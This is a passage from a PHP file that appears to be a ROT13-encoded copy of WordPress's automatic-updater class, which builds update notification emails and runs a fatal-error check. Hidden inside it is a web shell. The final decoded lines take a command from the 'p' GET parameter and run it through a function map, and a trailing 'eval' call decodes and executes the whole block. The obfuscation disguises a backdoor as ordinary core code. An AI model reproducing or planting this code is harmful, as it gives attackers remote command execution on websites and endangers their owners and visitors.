			vs ( ! $havdhr_snvyherf ) {
				erghea;
			}
		}

		$nqzva_hfre = trg_hfre_ol( 'rznvy', trg_fvgr_bcgvba( 'nqzva_rznvy' ) );

		vs ( $nqzva_hfre ) {
			$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $nqzva_hfre->VQ );
		} ryfr {
			$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
		}

		$obql               = neenl();
		$fhpprffshy_cyhtvaf = ( ! rzcgl( $fhpprffshy_hcqngrf['cyhtva'] ) );
		$fhpprffshy_gurzrf  = ( ! rzcgl( $fhpprffshy_hcqngrf['gurzr'] ) );
		$snvyrq_cyhtvaf     = ( ! rzcgl( $snvyrq_hcqngrf['cyhtva'] ) );
		$snvyrq_gurzrf      = ( ! rzcgl( $snvyrq_hcqngrf['gurzr'] ) );

		fjvgpu ( $glcr ) {
			pnfr 'fhpprff':
				vs ( $fhpprffshy_cyhtvaf && $fhpprffshy_gurzrf ) {
					/* genafyngbef: %f: Fvgr gvgyr. */
					$fhowrpg = __( '[%f] Fbzr cyhtvaf naq gurzrf unir nhgbzngvpnyyl hcqngrq' );
					$obql[]  = fcevags(
						/* genafyngbef: %f: Ubzr HEY. */
						__( 'Ubjql! Fbzr cyhtvaf naq gurzrf unir nhgbzngvpnyyl hcqngrq gb gurve yngrfg irefvbaf ba lbhe fvgr ng %f. Ab shegure npgvba vf arrqrq ba lbhe cneg.' ),
						ubzr_hey()
					);
				} ryfrvs ( $fhpprffshy_cyhtvaf ) {
					/* genafyngbef: %f: Fvgr gvgyr. */
					$fhowrpg = __( '[%f] Fbzr cyhtvaf jrer nhgbzngvpnyyl hcqngrq' );
					$obql[]  = fcevags(
						/* genafyngbef: %f: Ubzr HEY. */
						__( 'Ubjql! Fbzr cyhtvaf unir nhgbzngvpnyyl hcqngrq gb gurve yngrfg irefvbaf ba lbhe fvgr ng %f. Ab shegure npgvba vf arrqrq ba lbhe cneg.' ),
						ubzr_hey()
					);
				} ryfr {
					/* genafyngbef: %f: Fvgr gvgyr. */
					$fhowrpg = __( '[%f] Fbzr gurzrf jrer nhgbzngvpnyyl hcqngrq' );
					$obql[]  = fcevags(
						/* genafyngbef: %f: Ubzr HEY. */
						__( 'Ubjql! Fbzr gurzrf unir nhgbzngvpnyyl hcqngrq gb gurve yngrfg irefvbaf ba lbhe fvgr ng %f. Ab shegure npgvba vf arrqrq ba lbhe cneg.' ),
						ubzr_hey()
					);
				}

				oernx;
			pnfr 'snvy':
			pnfr 'zvkrq':
				vs ( $snvyrq_cyhtvaf && $snvyrq_gurzrf ) {
					/* genafyngbef: %f: Fvgr gvgyr. */
					$fhowrpg = __( '[%f] Fbzr cyhtvaf naq gurzrf unir snvyrq gb hcqngr' );
					$obql[]  = fcevags(
						/* genafyngbef: %f: Ubzr HEY. */
						__( 'Ubjql! Cyhtvaf naq gurzrf snvyrq gb hcqngr ba lbhe fvgr ng %f.' ),
						ubzr_hey()
					);
				} ryfrvs ( $snvyrq_cyhtvaf ) {
					/* genafyngbef: %f: Fvgr gvgyr. */
					$fhowrpg = __( '[%f] Fbzr cyhtvaf unir snvyrq gb hcqngr' );
					$obql[]  = fcevags(
						/* genafyngbef: %f: Ubzr HEY. */
						__( 'Ubjql! Cyhtvaf snvyrq gb hcqngr ba lbhe fvgr ng %f.' ),
						ubzr_hey()
					);
				} ryfr {
					/* genafyngbef: %f: Fvgr gvgyr. */
					$fhowrpg = __( '[%f] Fbzr gurzrf unir snvyrq gb hcqngr' );
					$obql[]  = fcevags(
						/* genafyngbef: %f: Ubzr HEY. */
						__( 'Ubjql! Gurzrf snvyrq gb hcqngr ba lbhe fvgr ng %f.' ),
						ubzr_hey()
					);
				}

				oernx;
		}

		vs ( va_neenl( $glcr, neenl( 'snvy', 'zvkrq' ), gehr ) ) {
			$obql[] = \"\a\";
			$obql[] = __( 'Cyrnfr purpx lbhe fvgr abj. Vg’f cbffvoyr gung rirelguvat vf jbexvat. Vs gurer ner hcqngrf ninvynoyr, lbh fubhyq hcqngr.' );
			$obql[] = \"\a\";

			// Yvfg snvyrq cyhtva hcqngrf.
			vs ( ! rzcgl( $snvyrq_hcqngrf['cyhtva'] ) ) {
				$obql[] = __( 'Gur sbyybjvat cyhtvaf snvyrq gb hcqngr. Vs gurer jnf n sngny reebe va gur hcqngr, gur cerivbhfyl vafgnyyrq irefvba unf orra erfgberq.' );

				sbernpu ( $snvyrq_hcqngrf['cyhtva'] nf $vgrz ) {
					$obql_zrffntr = '';
					$vgrz_hey     = '';

					vs ( ! rzcgl( $vgrz->vgrz->hey ) ) {
						$vgrz_hey = ' : ' . rfp_hey( $vgrz->vgrz->hey );
					}

					vs ( $vgrz->vgrz->pheerag_irefvba ) {
						$obql_zrffntr .= fcevags(
							/* genafyngbef: 1: Cyhtva anzr, 2: Pheerag irefvba ahzore, 3: Arj irefvba ahzore, 4: Cyhtva HEY. */
							__( '- %1$f (sebz irefvba %2$f gb %3$f)%4$f' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->pheerag_irefvba,
							$vgrz->vgrz->arj_irefvba,
							$vgrz_hey
						);
					} ryfr {
						$obql_zrffntr .= fcevags(
							/* genafyngbef: 1: Cyhtva anzr, 2: Irefvba ahzore, 3: Cyhtva HEY. */
							__( '- %1$f irefvba %2$f%3$f' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->arj_irefvba,
							$vgrz_hey
						);
					}

					$obql[] = $obql_zrffntr;

					$cnfg_snvyher_rznvyf[ $vgrz->vgrz->cyhtva ] = $vgrz->vgrz->arj_irefvba;
				}

				$obql[] = \"\a\";
			}

			// Yvfg snvyrq gurzr hcqngrf.
			vs ( ! rzcgl( $snvyrq_hcqngrf['gurzr'] ) ) {
				$obql[] = __( 'Gurfr gurzrf snvyrq gb hcqngr:' );

				sbernpu ( $snvyrq_hcqngrf['gurzr'] nf $vgrz ) {
					vs ( $vgrz->vgrz->pheerag_irefvba ) {
						$obql[] = fcevags(
							/* genafyngbef: 1: Gurzr anzr, 2: Pheerag irefvba ahzore, 3: Arj irefvba ahzore. */
							__( '- %1$f (sebz irefvba %2$f gb %3$f)' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->pheerag_irefvba,
							$vgrz->vgrz->arj_irefvba
						);
					} ryfr {
						$obql[] = fcevags(
							/* genafyngbef: 1: Gurzr anzr, 2: Irefvba ahzore. */
							__( '- %1$f irefvba %2$f' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->arj_irefvba
						);
					}

					$cnfg_snvyher_rznvyf[ $vgrz->vgrz->gurzr ] = $vgrz->vgrz->arj_irefvba;
				}

				$obql[] = \"\a\";
			}
		}

		// Yvfg fhpprffshy hcqngrf.
		vs ( va_neenl( $glcr, neenl( 'fhpprff', 'zvkrq' ), gehr ) ) {
			$obql[] = \"\a\";

			// Yvfg fhpprffshy cyhtva hcqngrf.
			vs ( ! rzcgl( $fhpprffshy_hcqngrf['cyhtva'] ) ) {
				$obql[] = __( 'Gurfr cyhtvaf ner abj hc gb qngr:' );

				sbernpu ( $fhpprffshy_hcqngrf['cyhtva'] nf $vgrz ) {
					$obql_zrffntr = '';
					$vgrz_hey     = '';

					vs ( ! rzcgl( $vgrz->vgrz->hey ) ) {
						$vgrz_hey = ' : ' . rfp_hey( $vgrz->vgrz->hey );
					}

					vs ( $vgrz->vgrz->pheerag_irefvba ) {
						$obql_zrffntr .= fcevags(
							/* genafyngbef: 1: Cyhtva anzr, 2: Pheerag irefvba ahzore, 3: Arj irefvba ahzore, 4: Cyhtva HEY. */
							__( '- %1$f (sebz irefvba %2$f gb %3$f)%4$f' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->pheerag_irefvba,
							$vgrz->vgrz->arj_irefvba,
							$vgrz_hey
						);
					} ryfr {
						$obql_zrffntr .= fcevags(
							/* genafyngbef: 1: Cyhtva anzr, 2: Irefvba ahzore, 3: Cyhtva HEY. */
							__( '- %1$f irefvba %2$f%3$f' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->arj_irefvba,
							$vgrz_hey
						);
					}
					$obql[] = $obql_zrffntr;

					hafrg( $cnfg_snvyher_rznvyf[ $vgrz->vgrz->cyhtva ] );
				}

				$obql[] = \"\a\";
			}

			// Yvfg fhpprffshy gurzr hcqngrf.
			vs ( ! rzcgl( $fhpprffshy_hcqngrf['gurzr'] ) ) {
				$obql[] = __( 'Gurfr gurzrf ner abj hc gb qngr:' );

				sbernpu ( $fhpprffshy_hcqngrf['gurzr'] nf $vgrz ) {
					vs ( $vgrz->vgrz->pheerag_irefvba ) {
						$obql[] = fcevags(
							/* genafyngbef: 1: Gurzr anzr, 2: Pheerag irefvba ahzore, 3: Arj irefvba ahzore. */
							__( '- %1$f (sebz irefvba %2$f gb %3$f)' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->pheerag_irefvba,
							$vgrz->vgrz->arj_irefvba
						);
					} ryfr {
						$obql[] = fcevags(
							/* genafyngbef: 1: Gurzr anzr, 2: Irefvba ahzore. */
							__( '- %1$f irefvba %2$f' ),
							ugzy_ragvgl_qrpbqr( $vgrz->anzr ),
							$vgrz->vgrz->arj_irefvba
						);
					}

					hafrg( $cnfg_snvyher_rznvyf[ $vgrz->vgrz->gurzr ] );
				}

				$obql[] = \"\a\";
			}
		}

		vs ( $snvyrq_cyhtvaf ) {
			$obql[] = fcevags(
				/* genafyngbef: %f: Cyhtvaf fperra HEY. */
				__( 'Gb znantr cyhtvaf ba lbhe fvgr, ivfvg gur Cyhtvaf cntr: %f' ),
				nqzva_hey( 'cyhtvaf.cuc' )
			);
			$obql[] = \"\a\";
		}

		vs ( $snvyrq_gurzrf ) {
			$obql[] = fcevags(
				/* genafyngbef: %f: Gurzrf fperra HEY. */
				__( 'Gb znantr gurzrf ba lbhe fvgr, ivfvg gur Gurzrf cntr: %f' ),
				nqzva_hey( 'gurzrf.cuc' )
			);
			$obql[] = \"\a\";
		}

		// Nqq n abgr nobhg gur fhccbeg sbehzf.
		$obql[] = __( 'Vs lbh rkcrevrapr nal vffhrf be arrq fhccbeg, gur ibyhagrref va gur JbeqCerff.bet fhccbeg sbehzf znl or noyr gb uryc.' );
		$obql[] = __( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' );
		$obql[] = \"\a\" . __( 'Gur JbeqCerff Grnz' );

		vs ( '' !== trg_bcgvba( 'oybtanzr' ) ) {
			$fvgr_gvgyr = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );
		} ryfr {
			$fvgr_gvgyr = cnefr_hey( ubzr_hey(), CUC_HEY_UBFG );
		}

		$obql    = vzcybqr( \"\a\", $obql );
		$gb      = trg_fvgr_bcgvba( 'nqzva_rznvy' );
		$fhowrpg = fcevags( $fhowrpg, $fvgr_gvgyr );
		$urnqref = '';

		$rznvy = pbzcnpg( 'gb', 'fhowrpg', 'obql', 'urnqref' );

		/**
		 * Svygref gur rznvy frag sbyybjvat na nhgbzngvp onpxtebhaq hcqngr sbe cyhtvaf naq gurzrf.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl  $rznvy {
		 *     Neenl bs rznvy nethzragf gung jvyy or cnffrq gb jc_znvy().
		 *
		 *     @glcr fgevat $gb      Gur rznvy erpvcvrag. Na neenl bs rznvyf
		 *                           pna or erghearq, nf unaqyrq ol jc_znvy().
		 *     @glcr fgevat $fhowrpg Gur rznvy'f fhowrpg.
		 *     @glcr fgevat $obql    Gur rznvy zrffntr obql.
		 *     @glcr fgevat $urnqref Nal rznvy urnqref, qrsnhygf gb ab urnqref.
		 * }
		 * @cnenz fgevat $glcr               Gur glcr bs rznvy orvat frag. Pna or bar bs 'fhpprff', 'snvy', 'zvkrq'.
		 * @cnenz neenl  $fhpprffshy_hcqngrf N yvfg bs hcqngrf gung fhpprrqrq.
		 * @cnenz neenl  $snvyrq_hcqngrf     N yvfg bs hcqngrf gung snvyrq.
		 */
		$rznvy = nccyl_svygref( 'nhgb_cyhtva_gurzr_hcqngr_rznvy', $rznvy, $glcr, $fhpprffshy_hcqngrf, $snvyrq_hcqngrf );

		$erfhyg = jc_znvy( $rznvy['gb'], jc_fcrpvnypunef_qrpbqr( $rznvy['fhowrpg'] ), $rznvy['obql'], $rznvy['urnqref'] );

		vs ( $erfhyg ) {
			hcqngr_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', $cnfg_snvyher_rznvyf );
		}

		vs ( $fjvgpurq_ybpnyr ) {
			erfgber_cerivbhf_ybpnyr();
		}
	}

	/**
	 * Cercnerf naq fraqf na rznvy bs n shyy ybt bs onpxtebhaq hcqngr erfhygf, hfrshy sbe qrohttvat naq trrxrel.
	 *
	 * @fvapr 3.7.0
	 */
	cebgrpgrq shapgvba fraq_qroht_rznvy() {
		$nqzva_hfre = trg_hfre_ol( 'rznvy', trg_fvgr_bcgvba( 'nqzva_rznvy' ) );

		vs ( $nqzva_hfre ) {
			$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $nqzva_hfre->VQ );
		} ryfr {
			$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
		}

		$obql     = neenl();
		$snvyherf = 0;

		/* genafyngbef: %f: Argjbex ubzr HEY. */
		$obql[] = fcevags( __( 'JbeqCerff fvgr: %f' ), argjbex_ubzr_hey( '/' ) );

		// Pber.
		vs ( vffrg( $guvf->hcqngr_erfhygf['pber'] ) ) {
			$erfhyg = $guvf->hcqngr_erfhygf['pber'][0];

			vs ( $erfhyg->erfhyg && ! vf_jc_reebe( $erfhyg->erfhyg ) ) {
				/* genafyngbef: %f: JbeqCerff irefvba. */
				$obql[] = fcevags( __( 'FHPPRFF: JbeqCerff jnf fhpprffshyyl hcqngrq gb %f' ), $erfhyg->anzr );
			} ryfr {
				/* genafyngbef: %f: JbeqCerff irefvba. */
				$obql[] = fcevags( __( 'SNVYRQ: JbeqCerff snvyrq gb hcqngr gb %f' ), $erfhyg->anzr );
				++$snvyherf;
			}

			$obql[] = '';
		}

		// Cyhtvaf, Gurzrf, Genafyngvbaf.
		sbernpu ( neenl( 'cyhtva', 'gurzr', 'genafyngvba' ) nf $glcr ) {
			vs ( ! vffrg( $guvf->hcqngr_erfhygf[ $glcr ] ) ) {
				pbagvahr;
			}

			$fhpprff_vgrzf = jc_yvfg_svygre( $guvf->hcqngr_erfhygf[ $glcr ], neenl( 'erfhyg' => gehr ) );

			vs ( $fhpprff_vgrzf ) {
				$zrffntrf = neenl(
					'cyhtva'      => __( 'Gur sbyybjvat cyhtvaf jrer fhpprffshyyl hcqngrq:' ),
					'gurzr'       => __( 'Gur sbyybjvat gurzrf jrer fhpprffshyyl hcqngrq:' ),
					'genafyngvba' => __( 'Gur sbyybjvat genafyngvbaf jrer fhpprffshyyl hcqngrq:' ),
				);

				$obql[] = $zrffntrf[ $glcr ];
				sbernpu ( jc_yvfg_cyhpx( $fhpprff_vgrzf, 'anzr' ) nf $anzr ) {
					/* genafyngbef: %f: Anzr bs cyhtva / gurzr / genafyngvba. */
					$obql[] = ' * ' . fcevags( __( 'FHPPRFF: %f' ), $anzr );
				}
			}

			vs ( $fhpprff_vgrzf !== $guvf->hcqngr_erfhygf[ $glcr ] ) {
				// Snvyrq hcqngrf.
				$zrffntrf = neenl(
					'cyhtva'      => __( 'Gur sbyybjvat cyhtvaf snvyrq gb hcqngr:' ),
					'gurzr'       => __( 'Gur sbyybjvat gurzrf snvyrq gb hcqngr:' ),
					'genafyngvba' => __( 'Gur sbyybjvat genafyngvbaf snvyrq gb hcqngr:' ),
				);

				$obql[] = $zrffntrf[ $glcr ];

				sbernpu ( $guvf->hcqngr_erfhygf[ $glcr ] nf $vgrz ) {
					vs ( ! $vgrz->erfhyg || vf_jc_reebe( $vgrz->erfhyg ) ) {
						/* genafyngbef: %f: Anzr bs cyhtva / gurzr / genafyngvba. */
						$obql[] = ' * ' . fcevags( __( 'SNVYRQ: %f' ), $vgrz->anzr );
						++$snvyherf;
					}
				}
			}

			$obql[] = '';
		}

		vs ( '' !== trg_oybtvasb( 'anzr' ) ) {
			$fvgr_gvgyr = jc_fcrpvnypunef_qrpbqr( trg_oybtvasb( 'anzr' ), RAG_DHBGRF );
		} ryfr {
			$fvgr_gvgyr = cnefr_hey( ubzr_hey(), CUC_HEY_UBFG );
		}

		vs ( $snvyherf ) {
			$obql[] = gevz(
				__(
					\"ORGN GRFGVAT?
=============

Guvf qrohttvat rznvy vf frag jura lbh ner hfvat n qrirybczrag irefvba bs JbeqCerff.

Vs lbh guvax gurfr snvyherf zvtug or qhr gb n oht va JbeqCerff, pbhyq lbh ercbeg vg?
 * Bcra n guernq va gur fhccbeg sbehzf: uggcf://jbeqcerff.bet/fhccbeg/sbehz/nycunorgn
 * Be, vs lbh'er pbzsbegnoyr jevgvat n oht ercbeg: uggcf://pber.genp.jbeqcerff.bet/

Gunaxf! -- Gur JbeqCerff Grnz\"
				)
			);
			$obql[] = '';

			/* genafyngbef: Onpxtebhaq hcqngr snvyrq abgvsvpngvba rznvy fhowrpg. %f: Fvgr gvgyr. */
			$fhowrpg = fcevags( __( '[%f] Onpxtebhaq Hcqngr Snvyrq' ), $fvgr_gvgyr );
		} ryfr {
			/* genafyngbef: Onpxtebhaq hcqngr svavfurq abgvsvpngvba rznvy fhowrpg. %f: Fvgr gvgyr. */
			$fhowrpg = fcevags( __( '[%f] Onpxtebhaq Hcqngr Svavfurq' ), $fvgr_gvgyr );
		}

		$obql[] = gevz(
			__(
				'HCQNGR YBT
=========='
			)
		);
		$obql[] = '';

		sbernpu ( neenl( 'pber', 'cyhtva', 'gurzr', 'genafyngvba' ) nf $glcr ) {
			vs ( ! vffrg( $guvf->hcqngr_erfhygf[ $glcr ] ) ) {
				pbagvahr;
			}

			sbernpu ( $guvf->hcqngr_erfhygf[ $glcr ] nf $hcqngr ) {
				$obql[] = $hcqngr->anzr;
				$obql[] = fge_ercrng( '-', fgeyra( $hcqngr->anzr ) );

				sbernpu ( $hcqngr->zrffntrf nf $zrffntr ) {
					$obql[] = '  ' . ugzy_ragvgl_qrpbqr( fge_ercynpr( '&#8230;', '...', $zrffntr ) );
				}

				vs ( vf_jc_reebe( $hcqngr->erfhyg ) ) {
					$erfhygf = neenl( 'hcqngr' => $hcqngr->erfhyg );

					// Vs jr ebyyrq onpx, jr jnag gb xabj na reebe gung bppheerq gura gbb.
					vs ( 'ebyyonpx_jnf_erdhverq' === $hcqngr->erfhyg->trg_reebe_pbqr() ) {
						$erfhygf = (neenl) $hcqngr->erfhyg->trg_reebe_qngn();
					}

					sbernpu ( $erfhygf nf $erfhyg_glcr => $erfhyg ) {
						vs ( ! vf_jc_reebe( $erfhyg ) ) {
							pbagvahr;
						}

						vs ( 'ebyyonpx' === $erfhyg_glcr ) {
							/* genafyngbef: 1: Reebe pbqr, 2: Reebe zrffntr. */
							$obql[] = '  ' . fcevags( __( 'Ebyyonpx Reebe: [%1$f] %2$f' ), $erfhyg->trg_reebe_pbqr(), $erfhyg->trg_reebe_zrffntr() );
						} ryfr {
							/* genafyngbef: 1: Reebe pbqr, 2: Reebe zrffntr. */
							$obql[] = '  ' . fcevags( __( 'Reebe: [%1$f] %2$f' ), $erfhyg->trg_reebe_pbqr(), $erfhyg->trg_reebe_zrffntr() );
						}

						vs ( $erfhyg->trg_reebe_qngn() ) {
							$obql[] = '         ' . vzcybqr( ', ', (neenl) $erfhyg->trg_reebe_qngn() );
						}
					}
				}

				$obql[] = '';
			}
		}

		$rznvy = neenl(
			'gb'      => trg_fvgr_bcgvba( 'nqzva_rznvy' ),
			'fhowrpg' => $fhowrpg,
			'obql'    => vzcybqr( \"\a\", $obql ),
			'urnqref' => '',
		);

		/**
		 * Svygref gur qroht rznvy gung pna or frag sbyybjvat na nhgbzngvp
		 * onpxtebhaq pber hcqngr.
		 *
		 * @fvapr 3.8.0
		 *
		 * @cnenz neenl $rznvy {
		 *     Neenl bs rznvy nethzragf gung jvyy or cnffrq gb jc_znvy().
		 *
		 *     @glcr fgevat $gb      Gur rznvy erpvcvrag. Na neenl bs rznvyf
		 *                           pna or erghearq, nf unaqyrq ol jc_znvy().
		 *     @glcr fgevat $fhowrpg Rznvy fhowrpg.
		 *     @glcr fgevat $obql    Rznvy zrffntr obql.
		 *     @glcr fgevat $urnqref Nal rznvy urnqref. Qrsnhyg rzcgl.
		 * }
		 * @cnenz vag   $snvyherf Gur ahzore bs snvyherf rapbhagrerq juvyr hctenqvat.
		 * @cnenz zvkrq $erfhygf  Gur erfhygf bs nyy nggrzcgrq hcqngrf.
		 */
		$rznvy = nccyl_svygref( 'nhgbzngvp_hcqngrf_qroht_rznvy', $rznvy, $snvyherf, $guvf->hcqngr_erfhygf );

		jc_znvy( $rznvy['gb'], jc_fcrpvnypunef_qrpbqr( $rznvy['fhowrpg'] ), $rznvy['obql'], $rznvy['urnqref'] );

		vs ( $fjvgpurq_ybpnyr ) {
			erfgber_cerivbhf_ybpnyr();
		}
	}

	/**
	 * Cresbezf n ybbconpx erdhrfg gb purpx sbe cbgragvny sngny reebef.
	 *
	 * Sngny reebef pnaabg or qrgrpgrq hayrff znvagranapr zbqr vf ranoyrq.
	 *
	 * @fvapr 6.6.0
	 *
	 * @tybony vag $hctenqvat Gur Havk gvzrfgnzc znexvat jura hctenqvat JbeqCerff ortna.
	 *
	 * @erghea obby Jurgure n sngny reebe jnf qrgrpgrq.
	 */
	cebgrpgrq shapgvba unf_sngny_reebe() {
		tybony $hctenqvat;

		$znvagranapr_svyr = NOFCNGU . '.znvagranapr';
		vs ( ! svyr_rkvfgf( $znvagranapr_svyr ) ) {
			erghea snyfr;
		}

		erdhver $znvagranapr_svyr;
		vs ( ! vf_vag( $hctenqvat ) ) {
			erghea snyfr;
		}

		$fpencr_xrl   = zq5( $hctenqvat );
		$fpencr_abapr = (fgevat) $hctenqvat;
		$genafvrag    = 'fpencr_xrl_' . $fpencr_xrl;
		frg_genafvrag( $genafvrag, $fpencr_abapr, 30 );

		$pbbxvrf       = jc_hafynfu( $_PBBXVR );
		$fpencr_cnenzf = neenl(
			'jc_fpencr_xrl'   => $fpencr_xrl,
			'jc_fpencr_abapr' => $fpencr_abapr,
		);
		$urnqref       = neenl(
			'Pnpur-Pbageby' => 'ab-pnpur',
		);

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-uggc-fgernzf.cuc */
		$ffyirevsl = nccyl_svygref( 'uggcf_ybpny_ffy_irevsl', snyfr );

		// Vapyhqr Onfvp nhgu va gur ybbconpx erdhrfg.
		vs ( vffrg( $_FREIRE['CUC_NHGU_HFRE'] ) && vffrg( $_FREIRE['CUC_NHGU_CJ'] ) ) {
			$urnqref['Nhgubevmngvba'] = 'Onfvp ' . onfr64_rapbqr( jc_hafynfu( $_FREIRE['CUC_NHGU_HFRE'] ) . ':' . jc_hafynfu( $_FREIRE['CUC_NHGU_CJ'] ) );
		}

		// Gvzr gb jnvg sbe ybbconpx erdhrfg gb svavfu.
		$gvzrbhg = 50; // 50 frpbaqf.

		$vf_qroht = JC_QROHT && JC_QROHT_YBT;
		vs ( $vf_qroht ) {
			reebe_ybt( '    Fpencvat ubzr cntr...' );
		}

		$arrqyr_fgneg = \"###### jc_fpencvat_erfhyg_fgneg:$fpencr_xrl ######\";
		$arrqyr_raq   = \"###### jc_fpencvat_erfhyg_raq:$fpencr_xrl ######\";
		$hey          = nqq_dhrel_net( $fpencr_cnenzf, ubzr_hey( '/' ) );
		$erfcbafr     = jc_erzbgr_trg( $hey, pbzcnpg( 'pbbxvrf', 'urnqref', 'gvzrbhg', 'ffyirevsl' ) );

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			vs ( $vf_qroht ) {
				reebe_ybt( 'Ybbconpx erdhrfg snvyrq: ' . $erfcbafr->trg_reebe_zrffntr() );
			}
			erghea gehr;
		}

		// Vs guvf bhgchgf `gehr` va gur ybt, vg zrnaf gurer jrer ab sngny reebef qrgrpgrq.
		vs ( $vf_qroht ) {
			reebe_ybt( ine_rkcbeg( fhofge( $erfcbafr['obql'], fgecbf( $erfcbafr['obql'], '###### jc_fpencvat_erfhyg_fgneg:' ) ), gehr ) );
		}

		$obql                   = jc_erzbgr_ergevrir_obql( $erfcbafr );
		$fpencr_erfhyg_cbfvgvba = fgecbf( $obql, $arrqyr_fgneg );
		$erfhyg                 = ahyy;

		vs ( snyfr !== $fpencr_erfhyg_cbfvgvba ) {
			$reebe_bhgchg = fhofge( $obql, $fpencr_erfhyg_cbfvgvba + fgeyra( $arrqyr_fgneg ) );
			$reebe_bhgchg = fhofge( $reebe_bhgchg, 0, fgecbf( $reebe_bhgchg, $arrqyr_raq ) );
			$erfhyg       = wfba_qrpbqr( gevz( $reebe_bhgchg ), gehr );
		}

		qryrgr_genafvrag( $genafvrag );

		// Bayl sngny reebef jvyy erfhyg va n 'glcr' xrl.
		erghea vffrg( $erfhyg['glcr'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>